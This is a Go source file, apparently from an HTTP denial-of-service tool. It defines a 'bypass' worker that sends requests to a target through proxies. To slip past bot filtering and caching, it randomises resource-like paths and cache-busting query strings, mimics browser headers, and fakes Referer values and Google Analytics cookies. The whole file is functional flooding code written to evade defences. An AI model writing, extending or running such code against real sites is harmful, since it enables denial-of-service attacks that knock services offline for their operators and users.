package http

import (
	"bytes"
	"context"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"strings"
	"time"

	core "github.com/sammwyy/mikumikubeam/internal/engine"
	"github.com/sammwyy/mikumikubeam/internal/netutil"
)

type bypassWorker struct{}

func NewBypassWorker() *bypassWorker { return &bypassWorker{} }

func (w *bypassWorker) Fire(ctx context.Context, params core.AttackParams, p core.Proxy, ua string, logCh chan<- core.AttackStats) error {
	tn := params.TargetNode
	target := tn.ToURL().String()

	// Randomize path and query to better mimic browsers hitting resources
	path := randomPath()
	u, err := url.Parse(target)
	if err != nil {
		return err
	}
	u.Path = joinURLPath(u.Path, path)
	q := u.Query()
	if rand.Intn(2) == 0 {
		q.Set("_", randomString(8))
	}
	u.RawQuery = q.Encode()

	client := netutil.DialedMimicHTTPClient(p, 6*time.Second, 3)

	// Prefer GET; sometimes POST small payload
	useGet := rand.Intn(100) < 80
	var req *http.Request
	if useGet {
		req, err = http.NewRequestWithContext(ctx, http.MethodGet, u.String(), nil)
	} else {
		body := bytes.NewBufferString(randomString(minNonZero(params.PacketSize, 256)))
		req, err = http.NewRequestWithContext(ctx, http.MethodPost, u.String(), io.NopCloser(body))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	if err != nil {
		return err
	}

	netutil.SetMimicHeaders(req, ua)
	if rand.Intn(2) == 0 {
		req.Header.Set("Referer", refFor(u))
	}
	if rand.Intn(2) == 0 {
		req.Header.Set("Cookie", "_ga="+randomString(8)+"; _gid="+randomString(8))
	}

	resp, err := client.Do(req)
	if err == nil && resp != nil {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		// Send log only if request was successful and verbose is enabled
		core.SendAttackLogIfVerbose(logCh, p, params.Target, params.Verbose)
	}
	return nil
}

func randomPath() string {
	// choose resource-like paths sometimes
	exts := []string{"", "", ".js", ".css", ".png", ".jpg", ".svg"}
	base := randomString(6)
	ext := exts[rand.Intn(len(exts))]
	if rand.Intn(3) == 0 {
		return base + "/" + randomString(4) + ext
	}
	return base + ext
}

func joinURLPath(a, b string) string {
	if strings.HasSuffix(a, "/") {
		return a + b
	}
	if a == "" {
		return "/" + b
	}
	return a + "/" + b
}

func refFor(u *url.URL) string {
	// Random referer: same origin or a popular site
	if rand.Intn(2) == 0 {
		r := *u
		r.Path = "/"
		r.RawQuery = ""
		return r.String()
	}
	refs := []string{"https://www.google.com", "https://www.youtube.com", "https://twitter.com"}
	return refs[rand.Intn(len(refs))]
}

func minNonZero(a, b int) int {
	if a <= 0 {
		return b
	}
	if a < b {
		return a
	}
	return b
}
